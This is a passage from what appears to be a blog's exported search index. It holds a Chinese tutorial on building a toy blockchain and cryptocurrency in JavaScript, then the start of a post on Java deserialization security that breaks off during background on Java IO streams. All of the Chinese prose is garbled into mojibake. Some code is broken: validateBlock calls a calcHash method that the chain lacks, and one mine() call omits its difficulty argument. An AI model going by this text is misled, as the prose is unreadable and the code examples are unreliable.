å¹³å°è·åˆ©æ¥æº | æ™ºèƒ½åˆçº¦ï¼ˆé“¾ä¸Šæ‰‹ç»­è´¹ï¼‰ | å¹¿å‘Šå•†æˆ–ç”¨æˆ·æ¶ˆè´¹ |\n| æ•°æ®æ‰€æœ‰æƒ | ç”¨æˆ· | å¼€å‘å•† |\n| å¹³å°æ§åˆ¶æƒ | å¼€å‘å•†æˆ–æ˜¯ DAO æ²»ç† | å¼€å‘å•† |\n| ç³»ç»Ÿ | åŒºå—é“¾ | Androidã€iOS |\n| ä»£ç æ˜¯å¦å¼€æº | ä»£ç çš†å…¬å¼€ï¼Œå¯ä¾›äººå‚è€ƒ | ä»£ç ä¸ºå…¬å¸æœºå¯†ï¼Œæ“…ç”¨è€…å¯èƒ½ä¼šåƒä¸Šå®˜å¸ |\n\n## æ™ºèƒ½åˆçº¦\n\næ™ºèƒ½åˆçº¦ï¼Œæ˜¯ä¸€æ®µå†™åœ¨åŒºå—é“¾ä¸Šçš„ä»£ç ï¼Œä¸€æ—¦æŸä¸ªäº‹ä»¶è§¦å‘åˆçº¦ä¸­çš„æ¡æ¬¾ï¼Œä»£ç å³è‡ªåŠ¨æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ»¡è¶³æ¡ä»¶å°±æ‰§è¡Œï¼Œä¸éœ€è¦äººä¸ºæ“æ§ï¼Œç±»ä¼¼äºä¼ ç»Ÿwebçš„åç«¯ä»£ç ã€‚\n\n# ç®€å•åŒºå—é“¾å®ç°\n\næˆ‘ä»¬ç”¨Javascriptæ¥æ‰‹å†™ä¸€ä¸ªå»ºè®®çš„åŒºå—é“¾å‡ºæ¥ï¼Œå…¶å®å’Œå†™ä¸€ä¸ªé“¾è¡¨å¾ˆåƒï¼š\n\n```jsx\nconst sha256 = require('crypto-js/sha256')\nDate = new Date()\n\nclass block{\n    constructor(data,time,previousHash) {\n        this.data = data\n        this.time = time\n        this.previousHash = previousHash\n        this.myHash = this.currHash()\n    }\n    currHash() {\n        return sha256(this.data + this.time + this.previousHash).toString()\n    }\n}\n\nclass blockCahin{\n    constructor()\n    {\n        this.chain = [this.createBlockchain()];\n    }\n    createBlockchain()\n    {\n        return new block(\"Genesisblock\",Date.toLocaleString(),0o0000000)\n    }\n    getLatestblock()\n    {\n        return this.chain[this.chain.length - 1]\n    }\n    addBlock(newBlock)\n    {\n        newBlock.previousHash = this.getLatestblock().myHash\n        newBlock.myHash = newBlock.currHash()\n        this.chain.push(newBlock)\n    }\n}\n\nBlockChain = new blockCahin()\nBlockChain.addBlock(new block(\"this is a test\",Date.toLocaleDateString(),\"anything\"))\nconsole.log(BlockChain)\n```\n\n![image-20230206143941660](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143941660.png)\n\næ¥ä¸‹æ¥æˆ‘ä»¬ç”¨ä»£ç å®ç°ä¸€ä¸‹ç®€æ˜“çš„POWï¼š\n\n```jsx\nconst sha256 = require(\"crypto-js/sha256\")\nfunction proofOfwork(){\n    let seed = \"y1zh3e7\"\n    let x = 1               // xä¸ºè‡ªå¢å˜é‡\n    while (true){\n        if(sha256(seed + x).toString().substring(0,4) != \"0000\") // å®šä¹‰éš¾åº¦ï¼Œæ¯”å¦‚æˆ‘ç°åœ¨è¦æ±‚é€šè¿‡ä¸æ–­è‡ªå¢xå»è®¡ç®—seed+xçš„å“ˆå¸Œå€¼\n        {                                                        // å½“å“ˆå¸Œå€¼å‰å››ä½éƒ½ä¸º0000æ—¶åˆ™ä»£è¡¨æˆåŠŸ å¦‚æœæƒ³æé«˜éš¾åº¦æˆ‘ä»¬å°±å¯ä»¥è®©å‰xä½ä¸ºxxxx\n            x += 1\n        }else{\n            console.log(sha256(seed + x).toString())\n            break\n        }\n    }\n    console.log(x)                                              // è¾“å‡ºè®¡ç®—å¤šå°‘æ¬¡åæˆåŠŸ\n}\n\nproofOfwork()\n```\n\nå®ç°é˜²ç¯¡æ”¹æœºåˆ¶ï¼š\n\n```jsx\n/***********************************************\néªŒè¯åŒºå—é“¾é˜²ç¯¡æ”¹éœ€è¦æ£€æµ‹ä¸¤é¡¹ï¼š                                    \n 1.é‡æ–°è®¡ç®—åŒºå—çš„hashå€¼ï¼Œåˆ¤æ–­ä¸åŒºå—ä¸­å‚¨å­˜çš„hashæ˜¯å¦ç›¸åŒ \n 2.åˆ¤æ–­å½“å‰åŒºå—çš„previousHashæ˜¯å¦å’Œä¸Šä¸€åŒºå—çš„hashç›¸åŒ \n ***********************************************/\nfunction validateBlock(validBlockchain){\n    if (validBlockchain.chain.length == 1)\n    {\n        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())\n        {\n            console.log(\"æ•°æ®ç¯¡æ”¹\")\n            return false\n        }\n    }else {\n        for (let i=1; i<=validBlockchain.chain.length-1; i++)\n        {\n            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())\n            {\n                console.log(\"æ•°æ®ç¯¡æ”¹\")\n                return false\n            }\n            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)\n            {\n                console.log(\"å‰ååŒºå—é“¾æ–­è£‚\")\n                return false\n            }\n        }\n    }\n    console.log(\"æ•°æ®æ— ç¯¡æ”¹ä¸”åŒºå—é“¾ç»“æ„å®Œæ•´\")\n    return true\n}\n```\n\nå°†å®Œæ•´çš„POWæ•´åˆåˆ°åŒºå—é“¾å½“ä¸­å¹¶å®ç°æŒ–çŸ¿åŠŸèƒ½ï¼Œæœ€ç»ˆå®ç°çš„å®Œæ•´åŒºå—é“¾ï¼š\n\n```jsx\nconst sha256 = require('crypto-js/sha256')\nDate = new Date()\n\nclass block{\n    constructor(data,time,previousHash) {\n        this.data = data\n        this.time = time\n        this.nonce = 1\n        this.previousHash = previousHash\n        this.myHash = this.calcHash()\n    }\n    calcHash() {\n        return sha256(this.data + this.time + this.previousHash + this.nonce).toString()\n    }\n    /**  **/\n    getAnswer(difficulty){\n        let answer = \"\"\n        for(let i=0; i<difficulty; i++)\n        {\n            answer += \"0\"\n        }\n        console.log(answer)\n        return answer\n    }\n   /** å¼•å…¥æŒ–çŸ¿åŠŸèƒ½ **/\n    mine(difficulty){\n        let answer = this.getAnswer(difficulty)\n        let Hash = this.calcHash()\n       while(true){\n            if (Hash.substring(0,difficulty) != answer)\n            {\n                this.nonce++\n                Hash = this.calcHash()\n            }else{\n                break\n            }\n       }\n       console.log(\"mine successful!\")\n       console.log(this.nonce)\n       return Hash\n    }\n}\n\nclass blockCahin{\n    constructor()\n    {\n        this.chain = [this.createBlockchain()]\n        this.difficulty = 5\n    }\n    createBlockchain()\n    {\n        return new block(\"Genesisblock\",Date.toLocaleString(),0o0000000)\n    }\n    getLatestblock()\n    {\n        return this.chain[this.chain.length - 1]\n    }\n    addBlock(newBlock)\n    {\n        newBlock.previousHash = this.getLatestblock().myHash\n        newBlock.myHash = newBlock.mine(this.difficulty)\n        this.chain.push(newBlock)\n    }\n}\n\n/***********************************************\néªŒè¯åŒºå—é“¾é˜²ç¯¡æ”¹éœ€è¦æ£€æµ‹ä¸¤é¡¹ï¼š\n 1.é‡æ–°è®¡ç®—åŒºå—çš„hashå€¼ï¼Œåˆ¤æ–­ä¸åŒºå—ä¸­å‚¨å­˜çš„hashæ˜¯å¦ç›¸åŒ\n 2.åˆ¤æ–­å½“å‰åŒºå—çš„previousHashæ˜¯å¦å’Œä¸Šä¸€åŒºå—çš„hashç›¸åŒ\n ***********************************************/\nfunction validateBlock(validBlockchain){\n    if (validBlockchain.chain.length == 1)\n    {\n        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())\n        {\n            console.log(\"æ•°æ®ç¯¡æ”¹\")\n            return false\n        }\n    }else {\n        for (let i=1; i<=validBlockchain.chain.length-1; i++)\n        {\n            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())\n            {\n                console.log(\"æ•°æ®ç¯¡æ”¹\")\n                return false\n            }\n            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)\n            {\n                console.log(\"å‰ååŒºå—é“¾æ–­è£‚\")\n                return false\n            }\n        }\n    }\n    console.log(\"æ•°æ®æ— ç¯¡æ”¹ä¸”åŒºå—é“¾ç»“æ„å®Œæ•´\")\n    return true\n}\n\nBlockChain = new blockCahin()\nBlockChain.addBlock(new block(\"this is a test\",Date.toLocaleDateString(),\"anything\"))\n// console.log(BlockChain)\n// BlockChain.chain[1].data = \"æ•°æ®ç¯¡æ”¹\"\n// BlockChain.chain[0].myHash = \"0012343566688\"\n// console.log(validateBlock(BlockChain))\n```\n\n# æ•°å­—è´§å¸çš„ç®€å•å®ç°\n\n## æ¯”ç‰¹å¸\n\næˆ‘ä»¬å‰é¢è¯´åˆ°åŒºå—é“¾æ˜¯ç”¨æ¥è®°å½•ä¿¡æ¯çš„ï¼Œå¦‚æœå®ƒè®°å½•çš„æ˜¯è½¬è´¦è®°å½•é‚£ä¹ˆå®ƒå°±æˆäº†ä¸€ä¸ªè´¦æœ¬ã€‚\n\nä¸€ç¬”è½¬è´¦ä¿¡æ¯éœ€è¦ä»¥ä¸‹å››ä¸ªä¿¡æ¯ï¼š\n\nä»˜æ¬¾äºº æ”¶æ¬¾äºº è½¬è´¦é‡‘é¢ è½¬è´¦æ—¶é—´\n\næˆ‘ä»¬å‰é¢æåˆ°äº†POWï¼Œæ¯”ç‰¹å¸ä¼šé€šè¿‡POWå°†äº§ç”Ÿä¸€ä¸ªåŒºå—çš„æ—¶é—´æ§åˆ¶åœ¨ååˆ†é’Ÿå·¦å³ï¼Œæ¯”ç‰¹å¸çš„å·¥ä½œæœºåˆ¶åŸºæœ¬å¦‚ä¸‹ï¼š\n\næ•´ä¸ªåŒºå—é“¾æ˜¯ä¸€ä¸ªç½‘çŠ¶çš„ç½‘ç»œç»“æ„ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªä¸­å¿ƒï¼Œæ¯ååˆ†é’Ÿå‘å¸ƒä¸€ä¸ªé—®é¢˜ï¼ˆç±»ä¼¼äºæˆ‘ä»¬ä¹‹é—´ç”Ÿæˆçš„ç›®æ ‡Hashï¼‰ï¼Œå½“é—®é¢˜å‘å¸ƒåï¼Œè¯¥ç½‘çŠ¶ç½‘ç»œä¸­çš„æ‰€æœ‰ç»“ç‚¹ä¼šæ¥è§£è¿™ä¸ªé—®é¢˜ï¼ˆæŒ–çŸ¿ï¼Œçˆ†ç ´ç›®æ ‡Hashå€¼ï¼‰ï¼Œæ­¤æ—¶å°±æ˜¯å„ç»“ç‚¹é—´çš„ç®—åŠ›æ¯”æ‹¼ï¼Œå½“æœ‰ä¸€ä¸ªç»“ç‚¹è§£å‡ºè¯¥é—®é¢˜ååˆ™ä»£è¡¨æŒ–çŸ¿æˆåŠŸï¼Œä¸€ä¸ªæ–°åŒºå—è¢«åˆ›é€ å‡ºæ¥ï¼Œè¿™æ—¶è¯¥æ–°åŒºå—å†…ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ç¬”è½¬è´¦è®°å½•ï¼Œå…¶ä¸­çš„æ”¶æ¬¾äººå°±æ˜¯è¯¥åŒºå—çš„æŒ–å‡ºè€…ï¼Œè¿™æ—¶åŒºå—é“¾å°±ä¼šè‡ªåŠ¨æŠŠå¥–åŠ±å‘æ”¾åˆ°æ”¶æ¬¾äººçš„è´¦æˆ·ä¸Šï¼Œå¹¶ä¸”è¯¥åŒºå—ä¼šåœ¨æ•´ä¸ªåŒºå—é“¾ç½‘ç»œä¸­è¿›è¡Œå¹¿æ’­ï¼ŒåŒºå—é“¾ä¸­çš„æ¯ä¸€ä¸ªç»“ç‚¹ä¼šå¯¹è¯¥åŒºå—è¿›è¡ŒéªŒè¯å…¶åˆæ³•æ€§ï¼Œç»è¿‡éªŒè¯åè¯¥æ–°åŒºå—å°±ä¼šè¢«åŠ åˆ°åŒºå—é“¾ä¸Šã€‚æ¯å››å¹´æ¯”ç‰¹å¸çš„å¥–åŠ±ä¼šå‡åŠä¸€æ¬¡ï¼Œæœ€åçš„æ¯”ç‰¹å¸æ€»é‡å¤§çº¦æ˜¯åœ¨2100ä¸‡ä¸ªå·¦å³ã€‚\n\né‚£ä¹ˆè¿™é‡Œä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœè¿‡äº†å‡ å¹´ä¹‹åï¼Œæ¯”ç‰¹å¸è¶Šæ¥è¶Šå°‘ï¼Œæ¯æ¬¡æŒ–çŸ¿åå‡ ä¹å¾—ä¸åˆ°æ¯”ç‰¹å¸äº†ï¼Œé‚£è¿˜ä¼šæœ‰äººæ¥æŒ–çŸ¿å—ï¼Ÿ\n\nå…¶å®æ¯”ç‰¹å¸åªæ˜¯æ¯”ç‰¹å¸åŒºå—é“¾ä¸­çš„ä¸€ä¸ªé¢å¤–å¥–åŠ±æœºåˆ¶ï¼Œæ•´ä¸ªåŒºå—é“¾è´§å¸ä¾èµ–çš„æ˜¯æ¯ä¸€ç¬”è½¬è´¦è®°å½•çš„æ‰‹ç»­è´¹ï¼Œå½“ä¸€ä¸ªæ–°åŒºå—è¢«æŒ–å‡ºæ—¶é‚£ä¹ˆè¿™ä¸ªæ–°åŒºå—çš„è½¬è´¦ä¿¡æ¯ï¼ˆæˆ‘ä»¬åˆšæ‰è¯´åˆ°çš„æ¯”ç‰¹å¸å¥–åŠ±æœºåˆ¶ï¼‰å°±ä¼šè®°å½•åœ¨è¿™ä¸ªæ–°åŒºå—ä¸Šï¼ˆä»¥è½¬è´¦çš„æ–¹å¼å‘æ”¾å¥–åŠ±è´§å¸ï¼‰ï¼Œåç»­ä¹Ÿä¼šè®°å½•å…¶ä»–çš„è½¬è´¦ä¿¡æ¯ï¼Œå¹¶ä¸”ä¼šäº§ç”Ÿæ‰‹ç»­è´¹ï¼Œæ‰‹ç»­è´¹å½’è®°å½•è¯¥ç¬”è½¬è´¦ä¿¡æ¯çš„åŒºå—çš„æŒ–å‡ºè€…æ‰€æœ‰ã€‚\n\nè¯´åˆ°åŠ¨æ€è°ƒæ•´éš¾åº¦ï¼Œæ¯”ç‰¹å¸æ˜¯æ€ä¹ˆè°ƒæ•´çš„å‘¢ï¼Ÿ\n\næ¯”ç‰¹å¸ä¼šåœ¨æ¯2016ä¸ªåŒºå—è¯ç”ŸåéªŒè¯ä¸€ä¸‹éš¾åº¦ï¼Œå¦‚æœè¯´æœ¬æ¥é¢„æœŸä¸­mineè¿™2016ä¸ªåŒºå—æ‰€éœ€è¦çš„æ—¶é—´æ˜¯ä¸¤ä¸ªæ˜ŸæœŸï¼Œè€Œå®é™…åªç”¨äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œé‚£ä¹ˆæ­¤æ—¶æ¯”ç‰¹å¸åŒºå—é“¾å°±ä¼šè°ƒæ•´éš¾åº¦ï¼Œä½¿å…¶è¾¾åˆ°é¢„æœŸï¼ŒåŸºæœ¬ä¸Šæ¯”ç‰¹å¸åŒºå—é“¾ä¼šæ¯ä¸¤ä¸ªæ˜ŸæœŸè°ƒæ•´ä¸€æ¬¡éš¾åº¦ã€‚\n\n## åˆ›å»ºè‡ªå·±çš„æ•°å­—è´§å¸\n\né¦–å…ˆæˆ‘ä»¬è¦æ–°å»ºä¸€ä¸ªTransactionç±»æ¥è¿›è¡Œè½¬è´¦è®°å½•ï¼š\n\n```jsx\nclass Transaction{\n    constructor(from, to , amount) {\n        this.from = from\n        this.to = to\n        this.amount = amount\n    }\n}\n```\n\næ›´æ”¹åŒºå—ä¸­dataçš„å«ä¹‰ï¼Œæ­¤æ—¶è¦è®°å½•çš„æ˜¯è½¬è´¦ä¿¡æ¯transactionï¼Œå¹¶ä¸”ç”±äºtransactionæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤åœ¨å‚ä¸è®¡ç®—å“ˆå¸Œæ—¶è¦è½¬ä¸ºå­—ç¬¦ä¸²ï¼ˆè¿™é‡Œå°†æ—¶é—´æ”¹ä¸ºäº†Date.nowï¼Œè¿™æ ·åœ¨åŒºå—åˆ›é€ æ—¶å°±è®°å½•äº†è¿™ç¬”è½¬è´¦è®°å½•çš„æ—¶é—´ï¼‰ï¼š\n\n```jsx\nclass Block{\n    constructor(transaction,previousHash) {\n        this.transactions = transaction\n        this.time = Date.now()\n        this.nonce = 1\n        this.previousHash = previousHash\n        this.myHash = this.calcHash()\n    }\n    // è®¡ç®—hashæ—¶è¦å°†dataè½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œæ­¤æ—¶çš„dataæ˜¯ä¸€ä¸ªtransaction\n    calcHash() {\n        return sha256(JSON.stringify(this.transactions) + this.time + this.previousHash + this.nonce).toString()\n    }\n```\n\nä¸Šé¢è¯´åˆ°å¥–åŠ±è´§å¸çš„å‘æ”¾æ˜¯é€šè¿‡è½¬è´¦çš„æ–¹å¼å®ç°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨é“¾ä¸Šå®ç°é€»è¾‘ï¼š\n\n```jsx\nclass blockChain{\n    constructor()\n    {\n        this.chain = [this.createBlockchain()]\n        this.difficulty = 5\n        this.transactionPool = []  //æŒ–çŸ¿æˆåŠŸçš„è½¬è´¦ä¿¡æ¯\n        this.mineReward = 50       //æ¯æ¬¡æŒ–çŸ¿æˆåŠŸçš„å¥–åŠ±è´§å¸æ•°\n    }\nmineTransaction(minerAddress)\n    {\n        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)\n        this.transactionPool.push(minerRewardTransaction)\n    }\n```\n\nä¹‹å‰æˆ‘ä»¬æ˜¯åœ¨å¤–éƒ¨ä¼ å…¥ä¸€ä¸ªåŒºå—ï¼Œåœ¨æ•´ä¸ªè´§å¸ç³»ç»Ÿçš„å®ç°ååŒºå—åº”è¯¥æ˜¯åœ¨æŒ–çŸ¿æ—¶åœ¨åŒºå—é“¾å†…éƒ¨äº§ç”Ÿçš„ï¼Œä¿®æ”¹ä»£ç ï¼š\n\n```jsx\n//å°†Transactionæ·»åŠ åˆ°Transaction Poolä¸­\n    addTransaction(Transaction)\n    {\n        this.transactionPool.push(Transaction)\n    }\n\t\t\n\t\tmineTransaction(minerAddress)\n    {\n        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)\n        this.transactionPool.push(minerRewardTransaction)\n\n        //æŒ–çŸ¿\n        /********************************************************\n         * è¿™é‡Œæ–°åŒºå—è®°å½•äº†æ•´ä¸ªåŒºå—é“¾çš„è½¬è´¦ä¿¡æ¯ï¼Œä½†åœ¨å®é™…æƒ…å†µä¸­åŒºå—çš„å­˜å‚¨\n         * å®¹é‡æ˜¯æœ‰é™åˆ¶çš„ï¼Œæ‰€ä»¥åœ¨æŒ–çŸ¿æ—¶è®°å½•çš„è½¬è´¦è®°å½•ä¼šé€‰æ‹©æ‰‹ç»­è´¹æœ€é«˜çš„transaction\n         * æˆ‘ä»¬è¿™é‡Œå…ˆä¸è€ƒè™‘è¿™ç§æƒ…å†µ\n         *******************************************************/\n        const newBlock = new Block(this.transactionPool,this.getLatestBlock().myHash)\n        newBlock.mine()\n\n        //æ·»åŠ åˆ°åŒºå—é“¾ï¼Œå¹¶æ¸…ç©ºTransaction Pool\n        this.chain.push(newBlock)\n        this.transactionPool = []\n    }\n```\n\næ•´ä¸ªå†™å¥½çš„æ•°å­—ä»£å¸ï¼š\n\n```jsx\nconst sha256 = require('crypto-js/sha256')\n\nclass Transaction{\n    constructor(from, to , amount) {\n        this.from = from\n        this.to = to\n        this.amount = amount\n    }\n}\nclass Block{\n    constructor(transaction,previousHash) {\n        this.transactions = transaction\n        this.time = Date.now()\n        this.nonce = 1\n        this.previousHash = previousHash\n        this.myHash = this.calcHash()\n    }\n    // è®¡ç®—hashæ—¶è¦å°†dataè½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œæ­¤æ—¶çš„dataæ˜¯ä¸€ä¸ªtransaction\n    calcHash() {\n        return sha256(JSON.stringify(this.transactions) + this.time + this.previousHash + this.nonce).toString()\n    }\n    /** è·å–ç›¸åº”éš¾åº¦hash **/\n    getAnswer(difficulty){\n        let answer = \"\"\n        for(let i=0; i<difficulty; i++)\n        {\n            answer += \"0\"\n        }\n        return answer\n    }\n   /** å¼•å…¥æŒ–çŸ¿åŠŸèƒ½ **/\n    mine(difficulty){\n        let answer = this.getAnswer(difficulty)\n        let Hash = this.calcHash()\n       while(true){\n            if (Hash.substring(0,difficulty) != answer)\n            {\n                this.nonce++\n                Hash = this.calcHash()\n            }else{\n                break\n            }\n       }\n       console.log(\"mine successful!\\n\")\n       console.log(\"è®¡ç®—\"+this.nonce+\"æ¬¡åæŒ–çŸ¿æˆåŠŸï¼Œanswerä¸º\"+Hash)\n       return Hash\n    }\n}\n\nclass blockChain{\n    constructor()\n    {\n        this.chain = [this.createBlockchain()]\n        this.difficulty = 4\n        this.transactionPool = []  //æŒ–çŸ¿æˆåŠŸçš„è½¬è´¦ä¿¡æ¯\n        this.mineReward = 50       //æ¯æ¬¡æŒ–çŸ¿æˆåŠŸçš„å¥–åŠ±è´§å¸æ•°\n    }\n    createBlockchain()\n    {\n        return new Block(\"Genesisblock\",null)\n    }\n    getLatestBlock()\n    {\n        return this.chain[this.chain.length - 1]\n    }\n    //å°†Transactionæ·»åŠ åˆ°Transaction Poolä¸­\n    addTransaction(Transaction)\n    {\n        this.transactionPool.push(Transaction)\n    }\n    mineTransaction(minerAddress)\n    {\n        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)\n        this.transactionPool.push(minerRewardTransaction)\n\n        //æŒ–çŸ¿\n        /********************************************************\n         * è¿™é‡Œæ–°åŒºå—è®°å½•äº†æ•´ä¸ªåŒºå—é“¾çš„è½¬è´¦ä¿¡æ¯ï¼Œä½†åœ¨å®é™…æƒ…å†µä¸­åŒºå—çš„å­˜å‚¨\n         * å®¹é‡æ˜¯æœ‰é™åˆ¶çš„ï¼Œæ‰€ä»¥åœ¨æŒ–çŸ¿æ—¶è®°å½•çš„è½¬è´¦è®°å½•ä¼šé€‰æ‹©æ‰‹ç»­è´¹æœ€é«˜çš„transaction\n         * æˆ‘ä»¬è¿™é‡Œå…ˆä¸è€ƒè™‘è¿™ç§æƒ…å†µ\n         *******************************************************/\n        const newBlock = new Block(this.transactionPool,this.getLatestBlock().myHash)\n        newBlock.mine(this.difficulty)\n\n        //æ·»åŠ åˆ°åŒºå—é“¾ï¼Œå¹¶æ¸…ç©ºTransaction Pool\n        this.chain.push(newBlock)\n        this.transactionPool = []\n    }\n\n}\n\n/***********************************************\néªŒè¯åŒºå—é“¾é˜²ç¯¡æ”¹éœ€è¦æ£€æµ‹ä¸¤é¡¹ï¼š\n 1.é‡æ–°è®¡ç®—åŒºå—çš„hashå€¼ï¼Œåˆ¤æ–­ä¸åŒºå—ä¸­å‚¨å­˜çš„hashæ˜¯å¦ç›¸åŒ\n 2.åˆ¤æ–­å½“å‰åŒºå—çš„previousHashæ˜¯å¦å’Œä¸Šä¸€åŒºå—çš„hashç›¸åŒ\n ***********************************************/\nfunction validateBlock(validBlockchain){\n    if (validBlockchain.chain.length == 1)\n    {\n        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())\n        {\n            console.log(\"æ•°æ®ç¯¡æ”¹\")\n            return false\n        }\n    }else {\n        for (let i=1; i<=validBlockchain.chain.length-1; i++)\n        {\n            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())\n            {\n                console.log(\"æ•°æ®ç¯¡æ”¹\")\n                return false\n            }\n            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)\n            {\n                console.log(\"å‰ååŒºå—é“¾æ–­è£‚\")\n                return false\n            }\n        }\n    }\n    console.log(\"æ•°æ®æ— ç¯¡æ”¹ä¸”åŒºå—é“¾ç»“æ„å®Œæ•´\")\n    return true\n}\n\nY1Coin = new blockChain()\nconst Transaction1 = new Transaction('add1', 'add2', 20)\nconst Transaction2 = new Transaction('add1', 'add2', 5)\nY1Coin.addTransaction(Transaction1)\nY1Coin.addTransaction(Transaction2)\nY1Coin.mineTransaction(\"add3\")\nconsole.log(Y1Coin)\nconsole.log(Y1Coin.chain[1].transactions)\n\n```\n\n![image-20230206144032572](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206144032572.png)\n","tags":["web3.0"],"categories":["åŒºå—é“¾"]},{"title":"Javaå®‰å…¨ååºåˆ—åŒ–é¢„å¤‡å…¨çŸ¥","url":"/2023/04/21/Javaå®‰å…¨ååºåˆ—åŒ–é¢„å¤‡å…¨çŸ¥/","content":"\n# JavaåŸç”Ÿåºåˆ—åŒ–/ååºåˆ—åŒ–\n\n# **Javaååºåˆ—åŒ–å…¥é—¨ç¯‡**\n\n## **Java IO**\n\nåœ¨å­¦ä¹ Javaååºåˆ—åŒ–ä¹‹å‰æˆ‘ä»¬å…ˆè¦äº†è§£ä¸€ä¸‹Javaçš„è¾“å…¥è¾“å‡ºæµï¼š\n\njavaçš„IOæµåˆ†ä¸ºäº†**æ–‡ä»¶IOæµï¼ˆFileInput/OutputStreamï¼‰å’Œå¯¹è±¡IOæµï¼ˆObjectInput/OutputStreamï¼‰**ï¼Œä»åå­—ä¸Šå°±å¯ä»¥çœ‹å‡ºæ¥ä¸€ä¸ªæ˜¯ç”¨æ¥å¯¹æ–‡ä»¶è¿›è¡Œè¾“å…¥å’Œè¾“å‡ºï¼Œä¸€ä¸ªæ˜¯å¯¹å¯¹è±¡è¿›è¡Œè¾“å…¥å’Œè¾“å‡ºã€‚\n\næµçš„ä¼ è¾“è¿‡ç¨‹ï¼š\n\né¦–å…ˆä¸ç®¡æ˜¯è¾“å…¥è¿˜æ˜¯è¾“å‡ºï¼Œä¼ è¾“çš„ä¸¤ç«¯éƒ½æ˜¯æ–‡ä»¶å’Œjavaçš„è¿è¡Œç¨‹åºï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦åœ¨è¿™äºŒè€…ä¹‹é—´è¿›è¡Œä¼ è¾“ï¼Œæˆ‘ä»¬å°±éœ€è¦å°†ä»–ä»¬ä¸¤ä¸ªä¹‹é—´æ­èµ·æ¥ä¸€ä¸ªå¯ä»¥ä¼ è¾“çš„é€šé“ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æµçš„ä¼ è¾“ã€‚\n\n- è¾“å‡ºæµï¼ˆOutputStreamï¼‰ï¼š\n\nå¦‚æœæˆ‘ä»¬æƒ³å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå†™å…¥æ“ä½œï¼Œé‚£ä¹ˆå®è´¨ä¸Šæ˜¯åœ¨javaç¨‹åºä¸­å°†æµï¼ˆæƒ³è¦å†™å…¥çš„å†…å®¹ï¼‰è¾“å‡ºåˆ°ç›®çš„æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æµçš„æ–¹å‘æ˜¯ä»javaè¾“å‡ºåˆ°æ–‡ä»¶ï¼Œä¸¾ä¸ªå¯¹æ–‡ä»¶å†™å…¥ä¸€ä¸ªå¯¹è±¡çš„ä¾‹å­ï¼š\n\n```\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"filename\"));\noos.writeObject(obj);\n\n```\n\né¦–å…ˆç”¨`new FileOutputStream`åˆ›å»ºä¸€ä¸ªæ–‡ä»¶è¾“å‡ºæµï¼Œå†ç”¨`new ObjectOutputStream`åˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å‡ºæµï¼ˆå› ä¸ºoosæ˜¯å¯¹è±¡è¾“å‡ºæµç±»å‹ï¼‰ï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥åœ¨javaç¨‹åºä¸­å‘å¤–ï¼ˆæ–‡ä»¶ï¼‰è¾“å‡ºæµï¼ˆå†…å®¹ï¼‰äº†ï¼Œç”»æˆå›¾å¤§æ¦‚æ˜¯è¿™æ ·ï¼š\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209271524379.jpg](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209271524379.jpg)\n\nå½“æˆ‘ä»¬è¦ç»™è¿™ä¸ªæ–‡ä»¶ä¼ ä¸€ä¸ªobjå¯¹è±¡æ—¶ï¼Œå°±ä¼šä»javaç¨‹åºé¡ºç€è¿™æ¡é€šé“è¿›å…¥åˆ°fileä¸­ã€‚\n\n- è¾“å…¥æµï¼ˆInputStreamï¼‰\n\nå…¶å®è¾“å…¥æµå’Œè¾“å‡ºæµæ„å»ºå‡ºä¼ è¾“é€šé“çš„æ–¹æ³•å‡ ä¹æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«å°±æ˜¯æµçš„è¾“å‡ºæ–¹å‘æ˜¯ä»fileæŒ‡å‘äº†javaç¨‹åºï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦readè¿™ä¸ªæ–‡ä»¶æˆ‘ä»¬å°±è¦ç”¨è¾“å…¥æµå°†fileè¾“å…¥åˆ°javaç¨‹åºä¸­è¿›è¡Œè¯»å–ã€‚\n\n## **Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹**\n\né¦–å…ˆä¸ºä»€ä¹ˆè¦è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œåœ¨ç¨‹åºè¿è¡Œç»“æŸåï¼Œè¿™ä¸ªç¨‹åºé‡Œçš„å¯¹è±¡éƒ½ä¼šè¢«åˆ é™¤ï¼Œå¹¶ä¸”å¯¹è±¡çš„æ„æˆå¾ˆå¤æ‚ï¼Œä¼ 